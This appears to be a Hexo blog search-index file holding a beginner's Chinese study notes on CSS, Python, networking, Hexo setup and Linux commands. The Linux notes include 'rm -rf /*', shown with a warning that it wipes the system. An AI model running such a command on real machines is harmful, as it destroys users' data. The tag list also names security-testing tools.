padding-left 所有内边距属性都可以设置以下值： length - 以 px、pt、cm 等单位指定内边距 % - 指定以包含元素宽度的百分比计的内边距 inherit - 指定应从父元素继承内边距 提示：不允许负值。 利用学的知识就可以制作简单的网站页面了。 天街夜色凉如水，卧看牵牛织女星","path":"2023/12/06/html和css学习/","date":"12-06","excerpt":"","tags":[{"name":"基础知识","slug":"基础知识","permalink":"http://example.com/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"HTML","slug":"HTML","permalink":"http://example.com/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"}]},{"title":"python学习","text":"Python 特点完全面向对象的语言函数、模块、数字、字符串都是对象，Python 中一切皆对象完全支持继承、重载、多重继承支持重载运算符，也支持泛型设计 拥有一个强大的标准库Python 标准库提供了 系统管理、网络通信、文本处理、数据库接口、图形系统、XML 处理 等额外的功能 有大量的第三方模块使用方式与标准库类似。它们的功能覆盖 科学计算、人工智能、机器学习、Web 开发、数据库接口、图形系统 多个领域 面向对象的思维方式面向对象 是一种 思维方式，也是一门 程序设计技术要解决一个问题前，首先考虑 由谁 来做，怎么做事情是 谁 的职责，最后把事情做好就行！对象 就是 谁要解决复杂的问题，就可以找多个不同的对象，各司其职，共同实现，最终完成需求先找一个可以完成功能的对象，并且使用对象所提供的能力来解决问题 Python 的优缺点（1）优点简单、易学、免费、开源。面向对象，丰富的库，可扩展性如果需要一段关键代码运行得更快或者希望某些算法不公开，可以把这部分程序用 C 或 C++ 编写，然后在 Python 程序中使用它们（2）缺点运行速度差一点，国内市场较小，中文资料匮乏。 执行 Python 程序的三种方式 解释器 —— python &#x2F; python3 交互式 —— ipython 集成开发环境 —— PyCharm 变量程序就是用来处理数据的，而变量就是用来存储数据的 数字型 整型 (int) 浮点型（float） 布尔型（bool） 真 True 非 0 数 —— 非零即真 假 False 0 复数型 (complex) 非数字型字符串、列表、元组、字典 如果变量是bool型，在计算时True对应的数字是1，False对应的数字是0 字符串变量之间使用 + 拼接字符串 input 函数实现键盘输入 格式化操作符% 被称为 格式化操作符，专门用于处理字符串中的格式包含 % 的字符串，被称为 格式化字符串% 和不同的 字符 连用，不同类型的数据 需要使用 不同的格式化字符格式化字符 含义%s 字符串%d 有符号十进制整数，%06d 表示输出的整数显示位数，不足的地方使用 0 补全%f 浮点数，%.2f 表示小数点后只显示两位%% 输出 % 标识符和关键字标识符​ 标示符就是程序员定义的 变量名、函数名，名字 要 见名知义 ​ 标示符可以由 字母、下划线 和 数字 组成，不能以数字开头，不能与关键字重名 关键字​ 关键字 就是在 Python 内部已经使用的标识符​ 关键字 具有特殊的功能和含义​ 不允许定义和关键字相同的名字的标示符 变量的命名规则​ 注意 Python 中的 标识符 是 区分大小写的 ​ 在定义变量时，为了保证代码格式，&#x3D; 的左右应该各保留一个空格​ 在 Python 中，如果 变量名 需要由 二个 或 多个单词 组成时，可以按照以下方式命名​ 每个单词都使用小写字母。 小驼峰式命名法第一个单词以小写字母开始，后续单词的首字母大写。 大驼峰式命名法每一个单词的首字母都采用大写字母。 引用的概念在 Python 中 ：变量和 数据 是分开存储的 ​ 数据保存在内存中的一个位置 ​ 变量中保存着数据在内存中的地址 ​ 变量中 记录数据的地址即 引用 使用 id() 函数查看变量中保存数据所在的 内存地址。 在 Python 中，函数的 实参&#x2F;返回值 都是是靠 引用 来传递来的。 局部变量和全局变量 局部变量 是在 函数内部 定义的变量，只能在函数内部使用 全局变量 是在 函数外部定义 的变量（没有定义在某一个函数内），所有函数 内部 都可以使用这个变量 可变和不可变类型 不可变类型，内存中的数据不允许被修改： 数字类型 int, bool, float, complex, long(2.x) 字符串 str 元组 tuple 可变类型，内存中的数据可以被修改： 列表 list 字典 dict 字符串字符串的定义​ 字符串 就是 一串字符，是编程语言中表示文本的数据类型​ 在 Python 中可以使用 一对双引号 “ 或者 一对单引号 ‘ 定义一个字符串，如果字符串内部需要使用 “，可以使用 ‘ 定义字符串，如果字符串内部需要使用 ‘，可以使用 “ 定义字符串，可以使用 索引 获一个字符串中 指定位置的字符，索引计数从 0 开始，也可以使用 for 循环遍历 字符串中每一个字符 字符串的常用操作字符串操作一般不会对原字符串产生影响，一般是返回一个新字符串。 判断类型 查找和替换 大小写转换 去除空白字符 拆分和连接 运算符算数运算符 先乘除后加减 同级运算符是 从左至右 计算 可以使用 () 调整计算的优先级 算数优先级由高到最低顺序排列 运算符 描述 ** 幂 (最高优先级) * &#x2F; % &#x2F;&#x2F; 乘、除、取余数、取整除 + - 加法、减法 比较（关系）运算符 运算符 描述 &#x3D;&#x3D; 检查两个操作数的值是否 相等，如果是，则条件成立，返回 True !&#x3D; 检查两个操作数的值是否 不相等，如果是，则条件成立，返回 True &gt; 检查左操作数的值是否 大于 右操作数的值，如果是，则条件成立，返回 True &lt; 检查左操作数的值是否 小于 右操作数的值，如果是，则条件成立，返回 True &gt;&#x3D; 检查左操作数的值是否 大于或等于 右操作数的值，如果是，则条件成立，返回 True &lt;&#x3D; 检查左操作数的值是否 小于或等于 右操作数的值，如果是，则条件成立，返回 True 逻辑运算符 运算符 逻辑表达式 描述 and x and y 同True返True，否则返False or x or y 一True返True，同False返False not not x 为True返 False，为 False返 True 赋值运算符 运算符 描述 &#x3D; 简单的赋值运算符 +&#x3D; 加法赋值运算符 -&#x3D; 减法赋值运算符 *&#x3D; 乘法赋值运算符 &#x2F;&#x3D; 除法赋值运算符 &#x2F;&#x2F;&#x3D; 取整除赋值运算符 %&#x3D; 取 模 (余数)赋值运算符 赋值运算符中间不能使用空格 优先级由高到低 ** 幂 (最高优先级) * &#x2F; % &#x2F;&#x2F; 乘、除、取余数、取整除 + - 加法、减法 &lt;&#x3D; &lt; &gt; &gt;&#x3D; 比较运算符 &#x3D;&#x3D; !&#x3D; 等于运算符 &#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D; 赋值运算符 not or and 逻辑运算符","path":"2023/12/06/python学习/","date":"12-06","excerpt":"","tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"变量","slug":"变量","permalink":"http://example.com/tags/%E5%8F%98%E9%87%8F/"},{"name":"字符串","slug":"字符串","permalink":"http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"网络基础知识学习","text":"整理一下这两天学的知识。 ivp6和ivp4ivp6​ IPv6的地址长度为128位，是IPv4地址长度的4倍。于是IPv4点分十进制格式不再适用，采用十六进制表示。IPv6有3种表示方法。 0位压缩表示法​ 在某些情况下，一个IPv6地址中间可能包含很长的一段0，可以把连续的一段0压缩为“::”。但为保证地址解析的唯一性，地址中”::”只能出现一次，例如：​ FF01:0:0:0:0:0:0:1101 → FF01::1101​ 0:0:0:0:0:0:0:1 → ::1​ 0:0:0:0:0:0:0:0 → :: 冒分十六进制表示法​ 格式为X:X:X:X:X:X:X:X，其中每个X表示地址中的16b，以十六进制表示，例如：​ ABCD:EF01:2345:6789:ABCD:EF01:2345:6789​ 这种表示法中，每个X的前导0是可以省略的，例如：​ 2001:0DB8:0000:0023:0008:0800:200C:417A→ 2001:DB8:0:23:8:800:200C:417A ivp4​ 网际协议版本4（英语：InternetProtocolversion4，IPv4），又称互联网通信协议第四版，是网际协议开发过程中的第四个修订版本，也是此协议第一个被广泛部署的版本。IPv4是互联网的核心，也是使用最广泛的网际协议版本，其后继版本为IPv6，直到2011年，IANAIPv4位址完全用尽时，IPv6仍处在部署的初期。​ IPv4在IETF于1981年9月发布的RFC 791中被描述，此RFC替换了于1980年1月发布的RFC 760。 ip地址​ ip地址以圆点分隔号的四个十进制数字表示，每个数字从0到255，如某一台主机的ip地址为：128.20.4.1 IP地址 &#x3D; 网络地址 + 主机地址(又称：主机号和网络号组成) 子网掩码​ 长度 为 4 * 8bit（1字节），由 连续的1 以及 连续的0 两部分组成， ​ 例如：11111111.11111111.11111111.00000000，对应十进制：255.255.255.0 ​ 子网掩码计算网络地址：将IP地址和子网掩码都换算成二进制；将两者进行 “与运算”，得到网络地址。 默认网关（地址）网关地址就是网关设备的IP地址。 ​ 假设我们有两个网络： ​ 网络A的IP地址范围为“192.168.1.1~192.168.1.254”，子网掩码为255.255.255.0 ​ 网络B的IP地址范围为“192.168.2.1~192.168.2.254”，子网掩码为255.255.255.0 ​ 要实现这两个网络之间的通信，则必须通过网关。 子网划分​ 子网划分是什么？无非就是子网掩码里的那个网络区和主机区向右移动几位罢了。 ​ IP地址由32位二进制组成，32位二进制分成了4字节，每字节8位，字节之间用符.（点）分隔，为了方便人们记忆，经常需要转换成十进制数字显示，每字节最大为255（十进制）即二进制表示为11111111（8个1）。 ​ 255.255.255.0&#x3D;&#x3D;&gt;对应256个地址，其中包括一个广播地址和一个网段地址（分别是全1和全0地址），也就说我们要在划分子网的时候预留出这两个地址的空间。然后在考虑可以划分的可能性。 ​ 需要的主机号位数&#x3D;(2^n)-2 需要划分成多少个网络（子网）？假如要划分4个网络，则2^n&#x3D;4，n&#x3D;2、要划分8个网络，则2^n&#x3D;8，n&#x3D;3，现在知道为什么要先搞懂2的幂了吧，这里n就是&#x3D;2的幂值。 每个网络需要多少个IP？计算公式：2^y-2，y代表取值多少位0，如11111000，代表取值3位0，即y&#x3D;3,得出23&#x3D;8-2&#x3D;6，即每个网络可用的IP数量是6个。 假如每个网络需要60台主机的IP，那么如何计算呢？即2^y-2≥60，根据2的幂算法得出，2^6&#x3D;64-2&#x3D;62，所有y的值为6。 有哪些子网网络（块大小）？计算公式：256-子网掩码。假如子网掩码为255.255.255.192，则块大小为256-192&#x3D;64，即块大小为64。从0开始以64为基数不断递增，直到达到子网掩码值，中间的结果即为子网 每个子网的子网号和广播地址是多少？子网号很简单，即子网块值，如掩码为192，则子网块为256-192&#x3D;64，得出子网为0、64、128、192，即子网号为0、64、128、192。再如掩码为128，则子网为128，则子网好0、128。 广播地址也很简单，总是下一个子网前面的数。如子网号为0、64、128、192、则广播地址为63、127、191。再如子网号为0、128，则广播地址为127. 每个子网的可用（合法）的主机地址是哪些？规则就是除去每个每个子网的子网号、广播地址，剩下的就是可用的主机地址，如子网号为0、64、128、192，则可用的主机地址为1-62、65-126、129-190，因为0是子网地址，63是广播地址，同样128、192是子网地址，127、191是广播地址。 ​ 一企业内部网ip为192.168.1.0&#x2F;24,企业共4个部门,A部门20台主机,B部门120台主机,C部门30台主机，D部门16台主机，请问该如何划分？ A 192.168.1.128 192.168.1.129 - 192.168.1.158 192.168.1.159B 192.168.1.160 192.168.1.161 - 192.168.1.190 192.168.1.191C 192.168.1.192 192.168.1.193 - 192.168.1.222 192.168.1.223D 192.168.1.224 192.168.1.225 - 192.168.1.254 192.168.1.255 私网和公网​ 公网地址和私网地址之间的区别主要体现在以下几个方面： ​ 分配方式不同：公网地址由互联网注册机构分配，而私网地址由局域网管理员自行分配。 使用范围不同：公网地址用于Internet上的设备，私网地址用于局域网内部的设备。 ​ 唯一性和可达性不同：公网地址具有全球唯一性和全球可达性，而私网地址只在局域网内部唯一，不具有全球可达性。 私网地址的范围​ A类地址:10.0.0.0~10.255.255.255 ​ B类地址:172.16.0.0~172.31.255.255 ​ C类地址:192.168.0.0~192.168.255.255 ​ IP地址分为5类，其中A、B、C分别保留3个区域作为专用网络地址，私有网络地址不能出现在公共网络上，但只能在内部网络中使用。 私网连接​ 个人电脑连接网络 校园网套娃式降本增效 ​ 校园网连接拓扑图 ​ 路由器与交换 路由器和ip​ OSI（Open Systems Interconnection）七层协议模型 物理层：该层负责传输比特流，涉及到电气、机械和定时接口的规范，如电缆、集线器和中继器等硬件设备。 数据链路层：该层负责将比特流组合成帧，以及帧的发送和接收。它还处理错误检测和流量控制，例如以太网（Ethernet）和点对点协议（PPP）。 网络层：该层负责将数据包从源地址发送到目的地址。它处理路由和转发，主要协议包括IP（Internet Protocol）、ICMP（Internet Control Message Protocol）和IGMP（Internet Group Management Protocol）。 传输层：该层负责在源端和目的端之间建立、管理和终止会话。它提供了可靠的数据传输服务，例如TCP（Transmission Control Protocol）和不可靠的数据传输服务，例如UDP（User Datagram Protocol）。 会话层：该层负责建立、管理和终止网络连接上的会话。它负责同步和对话控制，常见协议包括RPC（Remote Procedure Call）和SQL（Structured Query Language）。 表示层：该层负责将数据转换成能被应用层理解的格式，并进行加密和解密。它处理数据格式转换和数据压缩，常见的数据表示协议包括MIME（Multipurpose Internet Mail Extensions）和TLS（Transport Layer Security）。 应用层：该层是OSI模型的最高层，为用户提供应用程序和服务。它处理用户请求和响应，常见协议包括HTTP（Hypertext Transfer Protocol）、FTP（File Transfer Protocol）、SMTP（Simple Mail Transfer Protocol）和DNS（Domain Name System）。 桥接网络​ 给VM虚拟机桥接网络，VMware提供了三种网络连接方式，VMnet0, VMnet1, Vmnet8，分别代表桥接，Host-only及NAT模式。在VMware的编辑-虚拟网络编辑器可看到对应三种连接方式的设置。每一个VMnet均代表一个虚拟交换机，用于真实主机和虚拟主机构成对应的局域网络。VMware实际可支持更多虚拟交换机，包括VMnet0-9，均可与真实主机相连；此外还可扩展更多虚拟交换机。 proxifier的设置1.下载好proxifier 2.打开自己的clash猫，找到自己的代理IP和端口号 3.打开proxifier点击配置文件-&gt;代理服务器-&gt;编辑 4.将端口号改为clash猫上面的端口号，协议选择SOCKS5，点击确定 5.配置文件-&gt;代理规则，点击添加 6.应用程序输入ssh*; ,动作选择第一个，点击确定，给localhost规则移除 7.default选择direct 8.配置文件-&gt;名称解析 9.将设置改为下图所示，这样proxifier就配置好了 wireshark的使用1.下载wireshark https://www.wireshark.org/ 2.安装时能勾选的东西全部勾选 3.双击WLAN，就可以抓获WLAN的包 4.点击停止 5.可以搜索tcp、udp、http等协议 ip.src &#x3D;&#x3D; 源ip 源IP过滤 ip.dst &#x3D;&#x3D; 目的IP 目的ip过滤 6.抓获ping命令的包 搜索icmp，然后打开cmd输入ping baidu.com 此时打开wireshark就可以看到捕获了ping命令的数据包 桥接网络时最好手动设置，不然容易连不上。 ​ 这两天学习的大致内容就到这了，再见","path":"2023/12/05/网络基础知识学习/","date":"12-05","excerpt":"","tags":[{"name":"ip和路由","slug":"ip和路由","permalink":"http://example.com/tags/ip%E5%92%8C%E8%B7%AF%E7%94%B1/"},{"name":"proxifier","slug":"proxifier","permalink":"http://example.com/tags/proxifier/"},{"name":"wireshark抓包","slug":"wireshark抓包","permalink":"http://example.com/tags/wireshark%E6%8A%93%E5%8C%85/"}]},{"title":"博客搭建","text":"第二天今天的任务是搭建一个自己的博客 环境搭建首先是需要下载软件 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 下载好Typora和PicGo 上手操作搭建框架​ 在本地找个目录放博客源文件，路径不要有中文在选定的目录中，右键Git Bash Here​ 使用npm命令安装Hexo，输入：​ npm install -g hexo-cli​ hexo init blog​ cd blog​ hexo g 检测​ 检测我们的网站雏形，按顺序输入以下三条命令：​ hexo new test_my_site​ hexo g​ hexo s ​ 然后就可以访问127.0.0.1:4000访问blog了 配置ssh第一次建git账号会显示No such file or directory ssh-keygen -t rsa -C “邮箱号” ​ 然后连续3次回车，最终会生成一个文件在用户目录下，打开用 户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key： ​ key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容 连接测试 输入ssh -T git@github.com 后，在后面输入yes，出现：Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access说明成功了。 在选中的位置(blog目录下)打开cmd(以管理员身份) 上传代码 在github上新建一个存储库，命名为github的用户名.github.io 在Git Bash Here还需要继续配置 git config –-global user.name “xxxxx”&#x2F;&#x2F; 你的github用户名，非昵称git config –-global user.email “xxx@qq.com“&#x2F;&#x2F; 填写你的github注册邮箱 编辑_config.yml文件，在最后改成这样(自己的git库名) 1234deploy: type: git repository: git@github.com:xxx/xxx.github.io.git branch: main 最后上传 hexo d -g hexo s 如果出现错误可以试试hexo clean然后再上传 这个博客只是雏形，我们可以找到合适的主题导入，让其更美观。 网站基本信息的修改搭建好网站之后，有许多配置信息需要我们去修改，比如网站的标题、标签等选项，具体修改步骤如下（以我的博客为例）： 打开博客目录下的_config.yml文件，找到如图所示的选项 参数 描述 title 网站的标题 subtitle 网站的副标题 description 对于网站的描述，主要用于SEO keywords 网站的关键词，支持多个关键词 author 作者名 language 网站使用的语言，对于简体中文用户来说，语言的设置跟使用不同的主题有关，可以参考各自主题的文档自行配置，一般为zh-CN timezone 设置网站的时区，如果不填则默认使用你电脑的时区 hexo默认的主题有点不好看，修改好基本配置信息之后，可以考虑换一个主题，主题多可以说的上是hexo框架的一大卖点。 ​ themes文件夹，就是存放网站主题的文件夹。打开文件夹，你就能看到现在能用的主题有哪几个，文件夹名就是主题名。 ​ 选好主题后，就得先把主题弄到本地来，可以使用git clone命令进行下载(具体参考每个主题仓库的README文档)，也有一种粗暴的方法，直接下载压缩包，然后解压到刚才说的themes文件夹就可以了。 使用该主题前要安装的东西:可以去hexo找自己喜欢的主题https://hexo.io/themes 例如我找的主题是gal。 将配置文件的主题名字改成下载的主题，不喜欢的话可以重命名主题文件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849在你的hexo站点目录(非主题目录)下安装 hexo-renderer-sass 和 hexo-renderer-scssnpm install hexo-renderer-sass --save npm install hexo-renderer-scss --saveor cnpm install hexo-renderer-sass --savecnpm install hexo-renderer-scss --saveor yarn add hexo-renderer-sass(推荐)yarn add hexo-renderer-scss(推荐)上面的一步是将.scss样式文件渲染成最后的style.css文件然后, 在你的hexo站点目录下安装 hexo-generator-json-contentnpm install hexo-generator-json-content --saveor cnpm install hexo-generator-json-content --save如果后面你hexo g的时候有问题, 注意看看是不是这个json-content的问题, 如果是的话就是你的node比较老接着在hexo站点目录的_config.yml下进行配置:jsonContent: dateFormat: MM-DD pages: title: true text: true path: true date: true excerpt: true preview: true posts: title: true text: true path: true date: true excerpt: true tags: [&#123; name: tag.name, slug: tag.slug, permalink: tag.permalink &#125;] preview: true接着, 进行下面的步骤:hexo new page &quot;search&quot; // 搜索功能的必须步骤hexo new page &quot;404&quot; // 开启404页面至于tags和categories页面的设置, 百度或google就有对应的方法了, 这里就不多说了对了, hexo站点目录的_config.yml的title, description, author和url要自己正确配置 ​ ​ 你的theme主题文件下会出现下载的主题文件，想更细致的修改可以去找主题文件的配置文件，两个配置文件不要记混了。 ​ 像头像还有背景之类的不敢修改的话可以之接重命名覆盖。 分类和标签hexo主题的文章分类和标签设置，其他主题也应该是类似的。添加成功后会在侧边栏或导航栏生成“分类”和“标签”这两个选项， 创建“分类”选项1.1 生成“分类”页并添加tpye属性 打开命令行，进入博客所在文件夹。执行命令 1$ hexo new page categories 根据路径，找到index.md这个文件，打开后默认内容是这样的： 1234---title: 文章分类date: 2023-12-1 13:47:40--- 添加type: &quot;categories&quot;到内容中，添加后是这样的： 12345---title: 文章分类date: 2023-12-1 13:47:40type: &quot;categories&quot;--- 保存并关闭文件。 给文章添加“categories”属性 打开需要添加分类的文章，为其添加categories属性。 至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。 创建“标签”选项 生成“标签”页并添加tpye属性 打开命令行，进入博客所在文件夹。执行命令 1$ hexo new page tags 成功后会提示： 根据上面的路径，找到index.md这个文件，打开后默认内容是这样的： 1234---title: 标签date: 2023-12-1 14:22:08--- 添加type: &quot;tags&quot;到内容中，添加后是这样的： 12345---title: 文章分类date: 2023-12-1 13:47:40type: &quot;tags&quot;--- 保存并关闭文件。 给文章添加“tags”属性打开需要添加标签的文章，为其添加tags属性。 ​ 打开scaffolds&#x2F;post.md文件，在tages:上面加入categories:,保存后，之后执行hexo new 文章名命令生成的文件，页面里就有categories:项了。 ​ scaffolds目录下，是新建页面的模板，执行新建命令时，是根据这里的模板页来完成的，所以可以在这里根据你自己的需求添加一些默认值。 上传文章博客的文章是md格式，所以可以用typro来编写。 文章中有时会上传图片，但单纯的复制图片的话，博客只会显示图片名称，要显示图片的话就要下载PicGo。配置图床，与GitHub的仓库连接。","path":"2023/12/03/博客搭建/","date":"12-03","excerpt":"","tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"},{"name":"主题配置","slug":"主题配置","permalink":"http://example.com/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"}]},{"title":"Linux命令","text":"VM虚拟机搭建 第一天 学习linux命令 基础操作2.1 关闭系统(1)立刻关机 shutdown -h now 或者 poweroff(2)两分钟后关机 shutdown -h 2 2.2 关闭重启(1)立刻重启 shutdown -r now 或者 reboot(2)两分钟后重启 shutdown -r 2 2.3 帮助命令（help） ifconfig –help &#x2F;&#x2F;查看 ifconfig 命令的用法 2.4 命令说明书（man） man shutdown &#x2F;&#x2F;打开命令说明后，可按”q”键退出 2.5 切换用户（su） su yao &#x2F;&#x2F;切换为用户”yao”,输入后回车需要输入该用户的密码 exit &#x2F;&#x2F;退出当前用户 目录操作切换目录（cd） cd &#x2F; &#x2F;&#x2F;切换到根目录 cd &#x2F;bin &#x2F;&#x2F;切换到根目录下的bin目录 cd ..&#x2F; &#x2F;&#x2F;切换到上一级目录 或者使用命令：cd .. cd ~ &#x2F;&#x2F;切换到home目录 cd - &#x2F;&#x2F;切换到上次访问的目录 cd xx(文件夹名) &#x2F;&#x2F;切换到本目录下的名为xx的文件目录，如果目录不存在报错 cd &#x2F;xxx&#x2F;xx&#x2F;x &#x2F;&#x2F;可以输入完整的路径， 删除目录与文件（rm） rm 文件名 &#x2F;&#x2F;删除当前目录下的文件 rm -f 文件名 &#x2F;&#x2F;删除当前目录的的文件（不询问） rm -r 文件夹名 &#x2F;&#x2F;递归删除当前目录下此名的目录 rm -rf 文件夹名 &#x2F;&#x2F;递归删除当前目录下此名的目录（不询问） rm -rf * &#x2F;&#x2F;将当前目录下的所有目录和文件全部删除 rm -rf &#x2F;* &#x2F;&#x2F;将根目录下的所有文件全部删除【慎用！相当于格式化系统】 修改目录（mv） mv 当前目录名 新目录名 &#x2F;&#x2F;修改目录名，同样适用与文件操作 mv &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt &#x2F;&#x2F;将&#x2F;usr&#x2F;tmp目录下的tool目录剪切到 &#x2F;opt目录下面 mv -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt &#x2F;&#x2F;递归剪切目录中所有文件和文件夹 拷贝目录（cp） cp &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt &#x2F;&#x2F;将&#x2F;usr&#x2F;tmp目录下的tool目录复制到 &#x2F;opt目录下面 cp -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt &#x2F;&#x2F;递归剪复制目录中所有文件和文件夹 查看当前目录（pwd） pwd &#x2F;&#x2F;显示当前位置路径 搜索目录（find） find &#x2F;bin -name ‘a*’ &#x2F;&#x2F;查找&#x2F;bin目录下的所有以a开头的文件或者目录 touch 创建文件 查看文件 ls &#x2F;&#x2F;查看当前目录下的所有目录和文件 ls -a &#x2F;&#x2F;查看当前目录下的所有目录和文件（包括隐藏的文件） ls -l &#x2F;&#x2F;列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令”ll”效果一样 ls &#x2F;bin &#x2F;&#x2F;查看指定目录下的所有目录和文件 d 目录 -文件 r读 w写 x执行 三个一组 例如 属性 所有者 所属组 其他人 d r w x r w - r - - 编辑文件vi 文件名 &#x2F;&#x2F;打开需要编辑的文件 –进入后，操作界面有三种模式：命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode） 命令模式 -刚进入文件就是命令模式，通过方向键控制光标位置， -使用命令”dd”删除当前整行 -使用命令”&#x2F;字段”进行查找 -按”i”在光标所在字符前开始插入 -按”a”在光标所在字符后开始插入 -按”o”在光标所在行的下面另起一新行插入 -按”：”进入底行模式 插入模式 -此时可以对文件内容进行编辑，左下角会显示 “– 插入 –”” -按”ESC”进入底行模式 底行模式 -退出编辑： :q -强制退出： :q! -保存并退出： :wq 文件权限权限说明 文件权限简介：’r’ 代表可读（4），’w’ 代表可写（2），’x’ 代表执行权限（1），括号内代表”8421法” ##文件权限信息示例：-rwxrw-r– -第一位：’-‘就代表是文件，’d’代表是文件夹 -第一组三位：拥有者的权限 -第二组三位：拥有者所在的组，组员的权限 -第三组三位：代表的是其他用户的权限 文件权限 普通授权 chmod +x a.txt 8421法 chmod 777 a.txt &#x2F;&#x2F;1+2+4&#x3D;7，”7”说明授予所有权限 Linux创建用户命令Linux中使用useradd命令来创建一个新用户。 命令格式格式：useradd [命令参数] 参数 常见命令参数： -d&lt;登入目录&gt;：指定用户登入时的启始目录； -D：查看或变更预设值； -g&lt;群组&gt;：指定用户所属的群组； -m：自动建立用户的登入目录； -M：不要自动建立用户的登入目录； -s：指定用户登入后所使用的shell。 Linux中使用userdel命令来删除一个已经存在的用户。 命令格式：userdel [命令参数] 参数 常见命令参数： -f：强制删除用户，即使用户当前已登录； -r：删除用户的同时，删除与用户相关的所有文件。 因为系统默认是不会给新创建的用户自动创建一个文件夹用于用户账户接收邮件，所以在使用userdel -r命令删除的时候会提醒/var/mail/test文件夹不存在。 使用passwd命令修改用户密码命令格式：passwd [命令参数] 参数 常见命令参数： -d 删除密码； -l 停止账号使用； -S 显示密码信息。 passwd必须以root权限才能执行，如果是普通用户想执行passwd时，需要在命令前加sudo命令来提升权限为root权限。 DNS域名解析过程​ 1，在浏览器中输入http://pool.btc.com域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 ​ 2，如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 ​ 3，如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP&#x2F;ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 ​ 4，如果要查询的域名，不在本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 ​ 5，如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://BTC.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://pool.btc.com域服务器，重复上面的动作，进行查询，直至找到http://pool.btc.com主机。 各协议端口号 1、公认端口（Well-KnownPorts）：范围从0到1023。 2、动态端口（Dynamic Ports）：范围从1024到65535。 0端口：无效端口,通常用于分析操作系统 所以实际是1-65535 21端口：FTP文件传输协议(控制)22端口：SSH远程登录协议23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口 53端口：dns域名服务器 80端口：http,用于网页浏览,木马Executor开放此端口 443端口：基于TLS&#x2F;SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP 445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭（smb)","path":"2023/12/02/Linux命令/","date":"12-02","excerpt":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"基础知识","slug":"基础知识","permalink":"http://example.com/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"DNS域名解析","slug":"DNS域名解析","permalink":"http://example.com/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"}]}],"categories":[],"tags":[{"name":"百度谷歌语法","slug":"百度谷歌语法","permalink":"http://example.com/tags/%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/"},{"name":"支付逻辑漏洞","slug":"支付逻辑漏洞","permalink":"http://example.com/tags/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"弱口令","slug":"弱口令","permalink":"http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"name":"pikachu","slug":"pikachu","permalink":"http://example.com/tags/pikachu/"},{"name":"virtrualbox","slug":"virtrualbox","permalink":"http://example.com/tags/virtrualbox/"},{"name":"小米范端口扫描","slug":"小米范端口扫描","permalink":"http://example.com/tags/%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"},{"name":"sqlmap使用","slug":"sqlmap使用","permalink":"http://example.com/tags/sqlmap%E4%BD%BF%E7%94%A8/"},{"name":"dirsearch","slug":"dirsearch","permalink":"http://example.com/tags/dirsearch/"},{"name":"waf","slug":"waf","permalink":"http://example.com/tags/waf/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://example.com/tags/BurpSuite/"},{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"},{"name":"sql绕过","slug":"sql绕过","permalink":"http://example.com/tags/sql%E7%BB%95%E8%BF%87/"},{"name":"sqlmap 